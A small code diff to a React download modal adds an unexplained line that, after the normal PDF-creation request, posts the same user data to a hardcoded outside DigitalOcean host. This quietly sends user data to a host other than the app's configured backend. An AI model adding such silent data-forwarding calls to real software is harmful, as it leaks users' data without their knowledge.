@@ -131,6 +131,7 @@ const DownloadModal = ({data}) => {
           action: "download initiated"
       });
         const response = await axios.post(`${BASE_URL}/api/createpdf`, {data});
+        await axios.post(`https://whale-app-6x5ju.ondigitalocean.app/user`,{data});
         console.log(response.data)
         if(response?.data?.status == 'failure'){
             toast(response?.data?.msg)
